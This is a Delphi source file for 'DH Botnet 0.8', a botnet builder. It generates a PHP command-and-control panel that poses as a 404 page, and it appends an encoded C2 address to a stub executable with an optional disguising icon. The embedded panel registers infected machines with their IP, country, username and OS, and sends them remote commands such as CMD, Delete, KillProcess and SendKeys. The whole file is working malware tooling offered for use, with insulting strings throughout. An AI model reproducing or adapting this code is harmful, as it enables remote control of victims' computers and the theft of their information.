// DH Botnet 0.8
// (C) Doddy Hackman 2014

unit gen;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.StdCtrls,
  Vcl.ExtCtrls,
  Vcl.Imaging.pngimage, Madres, IdHash, IdHashMessageDigest;

type
  TForm1 = class(TForm)
    PageControl1: TPageControl;
    TabSheet1: TTabSheet;
    TabSheet2: TTabSheet;
    TabSheet3: TTabSheet;
    TabSheet4: TTabSheet;
    TabSheet5: TTabSheet;
    StatusBar1: TStatusBar;
    GroupBox1: TGroupBox;
    GroupBox2: TGroupBox;
    pagina: TEdit;
    GroupBox3: TGroupBox;
    timeout_pagina: TEdit;
    GroupBox4: TGroupBox;
    GroupBox5: TGroupBox;
    Label1: TLabel;
    Label2: TLabel;
    Label3: TLabel;
    Label4: TLabel;
    host_mysql: TEdit;
    user_mysql: TEdit;
    pass_mysql: TEdit;
    db_mysql: TEdit;
    GroupBox6: TGroupBox;
    GroupBox7: TGroupBox;
    Label5: TLabel;
    Label6: TLabel;
    Label7: TLabel;
    username_login: TEdit;
    password_login: TEdit;
    timeout_login: TEdit;
    GroupBox8: TGroupBox;
    GroupBox9: TGroupBox;
    GroupBox10: TGroupBox;
    Button1: TButton;
    GroupBox11: TGroupBox;
    Memo1: TMemo;
    Image1: TImage;
    Image2: TImage;
    Image3: TImage;
    GroupBox12: TGroupBox;
    Button2: TButton;
    ruta_icono: TEdit;
    OpenDialog1: TOpenDialog;
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
  private
    { Private declarations }
  public
    { Public declarations }
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
// Functions

procedure savefile(filename, texto: string);
var
  ar: TextFile;

begin

  try

    begin
      AssignFile(ar, filename);
      FileMode := fmOpenWrite;

      if FileExists(filename) then
        Append(ar)
      else
        Rewrite(ar);

      Write(ar, texto);
      CloseFile(ar);
    end;
  except
    //
  end;

end;

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

function md5_encode(const texto: String): String;
var
  makemd5: TIdHashMessageDigest5;
begin
  makemd5 := TIdHashMessageDigest5.Create;
  Result := LowerCase(makemd5.HashStringAsHex(texto));

end;

//

procedure TForm1.Button1Click(Sender: TObject);
begin

  OpenDialog1.InitialDir := GetCurrentDir;
  OpenDialog1.Filter := 'ICO|*.ico|';

  if OpenDialog1.Execute then
  begin
    Image2.Picture.LoadFromFile(OpenDialog1.filename);
    ruta_icono.Text := OpenDialog1.filename;
  end;
end;

procedure TForm1.Button2Click(Sender: TObject);
var
  linea: string;
  aca: THandle;
  code: Array [0 .. 9999 + 1] of Char;
  nose: DWORD;
  marca_uno: string;
  lineafinal: string;
  stubgenerado: string;
  change: DWORD;
  valor: string;

  codigo_botnet: string;

begin

  codigo_botnet := '<?php'+sLineBreak+
' '+sLineBreak+
'// DH Botnet'+sLineBreak+
'// Version 0.8'+sLineBreak+
'// Coded By Doddy H'+sLineBreak+
' '+sLineBreak+
'// Datos'+sLineBreak+
' '+sLineBreak+
'$username = "ACA_VA_TU_USER";'+sLineBreak+
'$password = "ACA_VA_TU_PASSWORD_EN_MD5";'+sLineBreak+
'$host = "ACA_VA_EL_HOST";'+sLineBreak+
'$userw = "ACA_VA_EL_USER";'+sLineBreak+
'$passw = "ACA_VA_EL_PASS";'+sLineBreak+
'$db = "ACA_VA_EL_NOMBRE";'+sLineBreak+
'$tiempo_de_carga = "ACA_VA_EL_TIEMPO_DE_CARGA";'+sLineBreak+
' '+sLineBreak+
'//'+sLineBreak+
' '+sLineBreak+
'// Start the party'+sLineBreak+
' '+sLineBreak+
'error_reporting(0);'+sLineBreak+
'mysql_connect($host, $userw, $passw);'+sLineBreak+
'mysql_select_db($db);'+sLineBreak+
' '+sLineBreak+
'//'+sLineBreak+
' '+sLineBreak+
'// Registro'+sLineBreak+
'if (isset($_POST[''entradatrasera''])) {'+sLineBreak+
'    $key = mysql_real_escape_string($_POST[''key'']);'+sLineBreak+
'    $ip = mysql_real_escape_string($_POST[''ip'']);'+sLineBreak+
'    $pais = mysql_real_escape_string($_POST[''pais'']);'+sLineBreak+
'    $username = mysql_real_escape_string($_POST[''username'']);'+sLineBreak+
'    $os = mysql_real_escape_string($_POST[''os'']);'+sLineBreak+
'    $timeout = mysql_real_escape_string($_POST[''timeout'']);'+sLineBreak+
'    $control = 0;'+sLineBreak+
'    $rea = mysql_query("select clave from slaves");'+sLineBreak+
'    while ($ver = mysql_fetch_array($rea)) {'+sLineBreak+
'        if ($ver[0] == $key) {'+sLineBreak+
'            $control = 1;'+sLineBreak+
'        }'+sLineBreak+
'    }'+sLineBreak+
'    if ($control == 0) {'+sLineBreak+
'        mysql_query("INSERT INTO slaves(id,clave,ip,pais,user,os,timeout)values(NULL,''$key'',''$ip'',''$pais'',''$username'',''$os'',''$timeout'')");'+sLineBreak+
'        mysql_query("INSERT INTO ordenes(id,clave)values(NULL,''$key'')");'+sLineBreak+
'    }'+sLineBreak+
'}'+sLineBreak+
'//'+sLineBreak+
'// Bots siguen vivos'+sLineBreak+
'if (isset($_POST[''sigovivo''])) {'+sLineBreak+
'    $clave = mysql_real_escape_string($_POST[''clavenow'']);'+sLineBreak+
'    mysql_query("UPDATE slaves set estado=''1'' where clave=''$clave''");'+sLineBreak+
'}'+sLineBreak+
'// Bots mandan rta'+sLineBreak+
'if (isset($_POST[''mandocarajo''])) {'+sLineBreak+
'    $clave = mysql_real_escape_string($_POST[''miclave'']);'+sLineBreak+
'    $rta = mysql_real_escape_string($_POST[''mirta'']);'+sLineBreak+
'    mysql_query("UPDATE ordenes set rta=''$rta'' where clave=''$clave''");'+sLineBreak+
'}'+sLineBreak+
'//'+sLineBreak+
'// Ordenes para bots'+sLineBreak+
'if (isset($_POST[''ordenespabots''])) {'+sLineBreak+
'    $h = mysql_real_escape_string($_POST[''clave'']);'+sLineBreak+
'    $rea = mysql_query("select * from ordenes where clave=''$h''");'+sLineBreak+
'    $ver = mysql_fetch_array($rea);'+sLineBreak+
'    $id = mysql_real_escape_string($ver[0]);'+sLineBreak+
'    $clave = mysql_real_escape_string($ver[1]);'+sLineBreak+
'    $orden = mysql_real_escape_string($ver[2]);'+sLineBreak+
'    $arg1 = mysql_real_escape_string($ver[3]);'+sLineBreak+
'    $arg2 = mysql_real_escape_string($ver[4]);'+sLineBreak+
'    $arg3 = mysql_real_escape_string($ver[5]);'+sLineBreak+
'    $rta = mysql_real_escape_string($ver[6]);'+sLineBreak+
'    echo "[+] ID : " . htmlentities($id) . "<br>";'+sLineBreak+
'    echo "[+] Clave : " . htmlentities($clave) . "<br>";'+sLineBreak+
'    echo "[+] Orden : " . htmlentities($orden) . "<br>";'+sLineBreak+
'    echo "[+] Arg1 : " . htmlentities($arg1) . "<br>";'+sLineBreak+
'    echo "[+] Arg2 : " . htmlentities($arg2) . "<br>";'+sLineBreak+
'    echo "[+] Arg3 : " . htmlentities($arg3) . "<br>";'+sLineBreak+
'    echo "[+] Rta : " . htmlentities($rta) . "<br>";'+sLineBreak+
'}'+sLineBreak+
'//'+sLineBreak+
'// Main'+sLineBreak+
'elseif (isset($_COOKIE[''portal''])) {'+sLineBreak+
'    colores();'+sLineBreak+
'    $st = base64_decode($_COOKIE[''portal'']);'+sLineBreak+
'    $plit = preg_split("/@/", $st);'+sLineBreak+
'    $user = $plit[0];'+sLineBreak+
'    $pass = $plit[1];'+sLineBreak+
'    if ($user == $username and $pass == $password) {'+sLineBreak+
'        echo "<title>DH Botnet 0.8</title>";'+sLineBreak+
'        if (isset($_POST[''instalar''])) {'+sLineBreak+
'            $todo = "'+sLineBreak+
'create table slaves ('+sLineBreak+
'id int(10) UNSIGNED NOT NULL AUTO_INCREMENT,'+sLineBreak+
'clave TEXT NOT NULL,'+sLineBreak+
'ip TEXT NOT NULL,'+sLineBreak+
'pais TEXT NOT NULL,'+sLineBreak+
'user TEXT NOT NULL,'+sLineBreak+
'os TEXT NOT NULL,'+sLineBreak+
'timeout TEXT NOT NULL,'+sLineBreak+
'estado TEXT NOT NULL,'+sLineBreak+
'PRIMARY KEY (id)'+sLineBreak+
');'+sLineBreak+
'";'+sLineBreak+
'            $todo2 = "'+sLineBreak+
'create table ordenes ('+sLineBreak+
'id int(10) UNSIGNED NOT NULL AUTO_INCREMENT,'+sLineBreak+
'clave TEXT NOT NULL,'+sLineBreak+
'orden TEXT NOT NULL,'+sLineBreak+
'arg1 TEXT NOT NULL,'+sLineBreak+
'arg2 TEXT NOT NULL,'+sLineBreak+
'arg3 TEXT NOT NULL,'+sLineBreak+
'rta TEXT NOT NULL,'+sLineBreak+
'PRIMARY KEY (id)'+sLineBreak+
');'+sLineBreak+
'";'+sLineBreak+
'            if (mysql_query($todo)) {'+sLineBreak+
'                if (mysql_query($todo2)) {'+sLineBreak+
'                    echo "<script>alert(''Installed'');</script>";'+sLineBreak+
'                }'+sLineBreak+
'            } else {'+sLineBreak+
'                echo "<script>alert(''Error'');</script>";'+sLineBreak+
'            }'+sLineBreak+
'        }'+sLineBreak+
'        if (mysql_num_rows(mysql_query("show tables like ''slaves''"))) {'+sLineBreak+
'            // TODO EL CODIGO DEL MENU'+sLineBreak+
'            if (isset($_POST[''about''])) {'+sLineBreak+
'                echo "'+sLineBreak+
'<center>'+sLineBreak+
' '+sLineBreak+
'<h1>[++] Commands :</h1><br><br>'+sLineBreak+
' '+sLineBreak+
'<h2>'+sLineBreak+
'CMD [command]<br>'+sLineBreak+
'GetProcess<br>'+sLineBreak+
'KillProcess [pid]<br>'+sLineBreak+
'ListDir [directory]<br>'+sLineBreak+
'Delete [file]<br>'+sLineBreak+
'OpenFile [file]<br>'+sLineBreak+
'OpenCD <br>'+sLineBreak+
'CloseCD<br>'+sLineBreak+
'HideIcons<br>'+sLineBreak+
'ShowIcons<br>'+sLineBreak+
'HideTaskbar<br>'+sLineBreak+
'ShowTaskbar<br>'+sLineBreak+
'OpenWord [text]<br>'+sLineBreak+
'SendKeys [text]<br>'+sLineBreak+
'CrazyMouse [time]<br>'+sLineBreak+
'</h2>'+sLineBreak+
'<br><br><br>";'+sLineBreak+
'                echo ''<a href="javascript:history.back()"><h1>Back</h1></a></center>'';'+sLineBreak+
'                exit(1);'+sLineBreak+
'            }'+sLineBreak+
'            if (isset($_GET[''borrar''])) {'+sLineBreak+
'                $id = $_GET[''borrar''];'+sLineBreak+
'                if (is_numeric($id)) {'+sLineBreak+
'                    if (@mysql_query("delete from slaves where id=''$id''")) {'+sLineBreak+
'                        if (@mysql_query("delete from ordenes where id=''$id''")) {'+sLineBreak+
'                            echo "<script>alert(''Deleted'');</script>";'+sLineBreak+
'                            echo "<META HTTP-EQUIV=''Refresh'' CONTENT=''0;URL=?''>";'+sLineBreak+
'                        }'+sLineBreak+
'                    }'+sLineBreak+
'                } else {'+sLineBreak+
'                    echo "<script>alert(''DIE MOTHER FUCKER'');</script>";'+sLineBreak+
'                }'+sLineBreak+
'            }'+sLineBreak+
'            if (isset($_GET[''console''])) {'+sLineBreak+
'                $id = $_GET[''console''];'+sLineBreak+
'                if (is_numeric($id)) {'+sLineBreak+
'                    $re = mysql_query("select * from ordenes where id=''$id''");'+sLineBreak+
'                    $ver = mysql_fetch_array($re);'+sLineBreak+
'                    echo "<center><br><h1>Console</h1><br>";'+sLineBreak+
'                    echo "<center><textarea cols=80 rows=40 name=code>";'+sLineBreak+
'                    echo htmlentities($ver[6]);'+sLineBreak+
'                    echo "</textarea></center><br>";'+sLineBreak+
'                    echo ''<a href="javascript:history.back()"><h1>Back</h1></a></center>'';'+sLineBreak+
'                    // ACTUALIZAR A NADA'+sLineBreak+
'                    mysql_query("UPDATE ordenes set orden='''',arg1='''',arg2='''',arg3='''',rta='''' where id=" . $id);'+sLineBreak+
'                    exit(1);'+sLineBreak+
'                } else {'+sLineBreak+
'                    echo "<script>alert(''DIE MOTHER FUCKER'');</script>";'+sLineBreak+
'                }'+sLineBreak+
'            }'+sLineBreak+
'            if (isset($_POST[''mandarcmd''])) { // MUY IMPORTANTE'+sLineBreak+
'                $op = mysql_real_escape_string($_POST[''options'']);'+sLineBreak+
'                $id = mysql_real_escape_string($_POST[''idiotas'']);'+sLineBreak+
'                $orden1 = mysql_real_escape_string($_POST[''cmd1'']);'+sLineBreak+
'                $orden2 = mysql_real_escape_string($_POST[''cmd2'']);'+sLineBreak+
'                $orden3 = mysql_real_escape_string($_POST[''cmd3'']);'+sLineBreak+
'                mysql_query("UPDATE ordenes set orden=''$op'',arg1=''$orden1'',arg2=''$orden2'',arg3=''$orden3'' where id=" . $id);'+sLineBreak+
'                $re = mysql_query("select * from slaves where id=''$id''");'+sLineBreak+
'                $ver = mysql_fetch_array($re);'+sLineBreak+
'                $timeout = $ver[6];'+sLineBreak+
'                $timeout = $timeout + $tiempo_de_carga;'+sLineBreak+
'                $time = $timeout;'+sLineBreak+
'                $timeout = $timeout * 1000;'+sLineBreak+
'                echo "<script>alert(''Wait " . htmlentities($time) . " seconds'');</script>";'+sLineBreak+
'                echo "'+sLineBreak+
'<script type=\"text/javascript\">'+sLineBreak+
'setTimeout (\"location.href=''?console=$id''\",$timeout);'+sLineBreak+
'</script>'+sLineBreak+
'";'+sLineBreak+
'            } //'+sLineBreak+
'            echo "'+sLineBreak+
'<br><br>'+sLineBreak+
'<center>'+sLineBreak+
'<h1>Infected idiots</h1>'+sLineBreak+
'<br><br>'+sLineBreak+
'";'+sLineBreak+
'            $re = mysql_query("select count(clave) from slaves");'+sLineBreak+
'            $ver = mysql_fetch_array($re);'+sLineBreak+
'            if ($ver[0] == 0) { //'+sLineBreak+
'                echo "<script>alert(''No idiots'');</script>";'+sLineBreak+
'            } else {'+sLineBreak+
'                $re = mysql_query("select * from slaves");'+sLineBreak+
'                echo "'+sLineBreak+
'<table border=1  width=1100>'+sLineBreak+
'<td ><b>ID</b></td><td ><b>Key</b></td><td ><b>IP</b></td><td ><b>Country</b></td><td ><b>Username</b></td><td ><b>OS</b></td><td ><b>Timeout</b></td><td><b>Status</b></td><td><b>Option</b></td><tr>'+sLineBreak+
'";'+sLineBreak+
'                $idiotas = array();'+sLineBreak+
'                while ($ver = mysql_fetch_array($re)) {'+sLineBreak+
'                    if ($ver[7] == 1) {'+sLineBreak+
'                        $estado = "Online";'+sLineBreak+
'                    } else {'+sLineBreak+
'                        $estado = "Offline";'+sLineBreak+
'                    }'+sLineBreak+
'                    echo "<td >" . htmlentities($ver[0]) . "</td><td >" . htmlentities($ver[1]) . "</td><td >" . htmlentities($ver[2]) . "</td><td >" . htmlentities($ver[3]) . "</td>";'+sLineBreak+
'                    echo "<td >" . htmlentities($ver[4]) . "</td><td >" . htmlentities($ver[5]) . "</td><td >" . htmlentities($ver[6]) . "</td><td>" . $estado . "<td><a href=?borrar=" . $ver[0] . ">Delete</a></td><tr>";'+sLineBreak+
'                    $idiotas[] = $ver[0];'+sLineBreak+
'                    mysql_query("UPDATE slaves set estado='''' where id=" . $ver[0]);'+sLineBreak+
'                }'+sLineBreak+
'                echo "</table>";'+sLineBreak+
'            } //'+sLineBreak+
'            echo "<form action='''' method=POST>";'+sLineBreak+
'            echo "'+sLineBreak+
' '+sLineBreak+
'<br><br><br><br>'+sLineBreak+
' '+sLineBreak+
'<table>'+sLineBreak+
'<td>'+sLineBreak+
'<b>Idiot :</b>'+sLineBreak+
'</td>'+sLineBreak+
'<td>'+sLineBreak+
'<select name=idiotas>";'+sLineBreak+
'            foreach($idiotas as $idiota) {'+sLineBreak+
'                echo "<option>" . $idiota . "</option>";'+sLineBreak+
'            }'+sLineBreak+
'            echo "'+sLineBreak+
'</select>'+sLineBreak+
'</td><tr>'+sLineBreak+
' '+sLineBreak+
'<td><b>Options : </b></td>'+sLineBreak+
'<td><select name=options>'+sLineBreak+
'<option>CMD</option>'+sLineBreak+
'<option>GetProcess</option>'+sLineBreak+
'<option>KillProcess</option>'+sLineBreak+
'<option>ListDir</option>'+sLineBreak+
'<option>Delete</option>'+sLineBreak+
'<option>OpenFile</option>'+sLineBreak+
'<option>OpenCD</option>'+sLineBreak+
'<option>CloseCD</option>'+sLineBreak+
'<option>HideIcons</option>'+sLineBreak+
'<option>ShowIcons</option>'+sLineBreak+
'<option>HideTaskbar</option>'+sLineBreak+
'<option>ShowTaskbar</option>'+sLineBreak+
'<option>OpenWord</option>'+sLineBreak+
'<option>SendKeys</option>'+sLineBreak+
'<option>CrazyMouse</option>'+sLineBreak+
'</select></td><tr>'+sLineBreak+
' '+sLineBreak+
'<td><b>Command 1 : </b></td><td><input type=text name=cmd1></td><tr>'+sLineBreak+
'<td><b>Command 2 : </b></td><td><input type=text name=cmd2></td><tr>'+sLineBreak+
'<td><b>Command 3 : </b></td><td><input type=text name=cmd3></td>'+sLineBreak+
'</table><br>'+sLineBreak+
'<input type=submit name=mandarcmd value=Send> <input type=submit name=about value=Help>'+sLineBreak+
'";'+sLineBreak+
'            echo "</form>";'+sLineBreak+
'            echo "<br><br><br><br><br><br><br><h2>-- == (C) Doddy Hackman 2014 || Contact : lepuke[at]hotmail[com] || Web : http://doddyhackman.webcindario.com == --</h2>";'+sLineBreak+
'        } else {'+sLineBreak+
'            echo "'+sLineBreak+
'<center><br><br>'+sLineBreak+
'<form action='''' method=POST>'+sLineBreak+
'<h2>Want to install DH Botnet 0.8 ?</h2><br><br>'+sLineBreak+
'<input type=submit name=instalar value=Install>'+sLineBreak+
'</form>";'+sLineBreak+
'        }'+sLineBreak+
'        exit(1);'+sLineBreak+
'    }'+sLineBreak+
'} elseif (isset($_POST[''login''])) {'+sLineBreak+
'    if ($_POST[''user''] == $username and md5($_POST[''passwor'']) == $password) {'+sLineBreak+
'        setcookie("portal", base64_encode($_POST[''user''] . "@" . md5($_POST[''passwor''])));'+sLineBreak+
'        echo "<script>alert(''Welcome idiot'');</script>";'+sLineBreak+
'        echo ''<meta http-equiv="refresh" content=0;URL=>'';'+sLineBreak+
'    } else {'+sLineBreak+
'        echo "<script>alert(''DIE MOTHER FUCKER DIE'');</script>";'+sLineBreak+
'        echo ''<meta http-equiv="refresh" content=0;URL=>'';'+sLineBreak+
'    }'+sLineBreak+
'} elseif (isset($_GET[''poraca''])) {'+sLineBreak+
'    colores();'+sLineBreak+
'    echo "'+sLineBreak+
'<br><h1><center>Login</center></h1>'+sLineBreak+
'<br><br><center>'+sLineBreak+
'<form action='''' method=POST>'+sLineBreak+
'<b>Username : </b><input type=text name=user><br><br>'+sLineBreak+
'<b>Password : </b><input type=password name=passwor><br><br>'+sLineBreak+
'<input type=submit name=login value=Enter><br>'+sLineBreak+
'</form>'+sLineBreak+
'</center><br><br>";'+sLineBreak+
'} else {'+sLineBreak+
'    error();'+sLineBreak+
'}'+sLineBreak+
'//'+sLineBreak+
'// Funciones secundarias'+sLineBreak+
'function colores() {'+sLineBreak+
'    // Colores'+sLineBreak+
'    $color = "#00FF00";'+sLineBreak+
'    $fondo = "#000000";'+sLineBreak+
'    echo "'+sLineBreak+
' '+sLineBreak+
'<STYLE type=text/css>'+sLineBreak+
' '+sLineBreak+
'body,a:link {'+sLineBreak+
'background-color: $fondo;'+sLineBreak+
'color:$color;'+sLineBreak+
'Courier New;'+sLineBreak+
'cursor:crosshair;'+sLineBreak+
'font: normal 0.7em sans-serif,Arial;'+sLineBreak+
'}'+sLineBreak+
' '+sLineBreak+
'input,textarea,fieldset,select,table,td,tr,option,select {'+sLineBreak+
'font: normal 13px Verdana, Arial, Helvetica,'+sLineBreak+
'sans-serif;'+sLineBreak+
'background-color:$fondo;'+sLineBreak+
'color:$color;'+sLineBreak+
'border: solid 1px $color;'+sLineBreak+
'border-color:$color'+sLineBreak+
'}'+sLineBreak+
' '+sLineBreak+
'a:link,a:visited,a:active {'+sLineBreak+
'color:$color;'+sLineBreak+
'font: normal 10px Verdana, Arial, Helvetica,'+sLineBreak+
'sans-serif;'+sLineBreak+
'text-decoration: none;'+sLineBreak+
'}'+sLineBreak+
' '+sLineBreak+
'</style>'+sLineBreak+
' '+sLineBreak+
'";'+sLineBreak+
'}'+sLineBreak+
'function error() {'+sLineBreak+
'    echo ''<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">'+sLineBreak+
'<html><head>'+sLineBreak+
'<title>404 Not Found</title>'+sLineBreak+
'</head><body>'+sLineBreak+
'<h1>Not Found</h1>'+sLineBreak+
'<p>The requested URL was not found on this server.</p>'+sLineBreak+
'</body></html>'';'+sLineBreak+
'    exit(1);'+sLineBreak+
'}'+sLineBreak+
'// End'+sLineBreak+
'mysql_close();'+sLineBreak+
'//'+sLineBreak+
' '+sLineBreak+
'// The End ?'+sLineBreak+
' '+sLineBreak+
'?>'+sLineBreak;

  codigo_botnet := StringReplace(codigo_botnet, 'ACA_VA_TU_USER',
    username_login.Text, [rfReplaceAll, rfIgnoreCase]);
  codigo_botnet := StringReplace(codigo_botnet, 'ACA_VA_TU_PASSWORD_EN_MD5',
    md5_encode(password_login.Text), [rfReplaceAll, rfIgnoreCase]);
  codigo_botnet := StringReplace(codigo_botnet, 'ACA_VA_EL_HOST',
    host_mysql.Text, [rfReplaceAll, rfIgnoreCase]);
  codigo_botnet := StringReplace(codigo_botnet, 'ACA_VA_EL_USER',
    user_mysql.Text, [rfReplaceAll, rfIgnoreCase]);
  codigo_botnet := StringReplace(codigo_botnet, 'ACA_VA_EL_PASS',
    pass_mysql.Text, [rfReplaceAll, rfIgnoreCase]);
  codigo_botnet := StringReplace(codigo_botnet, 'ACA_VA_EL_NOMBRE',
    db_mysql.Text, [rfReplaceAll, rfIgnoreCase]);
  codigo_botnet := StringReplace(codigo_botnet, 'ACA_VA_EL_TIEMPO_DE_CARGA',
    timeout_login.Text, [rfReplaceAll, rfIgnoreCase]);

  stubgenerado := 'server_ready.exe';

  DeleteFile('index_botnet.php');
  savefile('index_botnet.php', codigo_botnet);

  lineafinal := '[url]' + pagina.Text + '[url]' + '[time]' + timeout_pagina.Text
    + '[time]';

  marca_uno := '[63686175]' + dhencode(lineafinal, 'encode') + '[63686175]';

  aca := INVALID_HANDLE_VALUE;
  nose := 0;

  DeleteFile(stubgenerado);
  CopyFile(PChar(ExtractFilePath(Application.ExeName) + '/' + 'Data/stub.exe'),
    PChar(ExtractFilePath(Application.ExeName) + '/' + stubgenerado), True);

  linea := marca_uno;
  StrCopy(code, PChar(linea));
  aca := CreateFile(PChar(stubgenerado), GENERIC_WRITE, FILE_SHARE_READ, nil,
    OPEN_EXISTING, 0, 0);
  if (aca <> INVALID_HANDLE_VALUE) then
  begin
    SetFilePointer(aca, 0, nil, FILE_END);
    WriteFile(aca, code, 9999, nose, nil);
    CloseHandle(aca);
  end;

  if not(ruta_icono.Text = '') then
  begin
    try
      begin

        valor := IntToStr(128);

        change := BeginUpdateResourceW
          (PWideChar(wideString(ExtractFilePath(Application.ExeName) + '/' +
          stubgenerado)), False);
        LoadIconGroupResourceW(change, PWideChar(wideString(valor)), 0,
          PWideChar(wideString(ruta_icono)));
        EndUpdateResourceW(change, False);
        StatusBar1.Panels[0].Text := '[+] Done ';
        StatusBar1.Update;
      end;
    except
      begin
        StatusBar1.Panels[0].Text := '[-] Error';
        StatusBar1.Update;
      end;
    end;
  end
  else
  begin
    StatusBar1.Panels[0].Text := '[+] Done ';
    StatusBar1.Update;
  end;
end;

end.

// The End ?
